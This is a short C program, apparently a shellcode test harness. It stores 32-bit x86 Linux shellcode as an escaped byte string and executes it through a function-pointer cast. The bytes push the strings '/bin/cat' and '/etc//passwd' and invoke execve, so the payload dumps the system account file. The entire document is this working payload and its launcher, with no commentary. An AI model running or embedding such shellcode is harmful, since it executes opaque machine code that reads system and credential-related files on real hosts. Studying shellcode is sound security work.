
#include <stdio.h>
#include <string.h>
unsigned char shellcode[]=
"\x31\xd2\x52\xc7\x44\x24\xfc\x2f\x63\x61\x74\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x52\xc7\x44\x24\xfc\x73\x73\x77\x64\xc7\x44\x24\xf8\x2f\x2f\x70\x61\xc7\x44\x24\xf5\x2f\x65\x74\x63\x83\xec\x0b\x89\xe1\x31\xc0\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
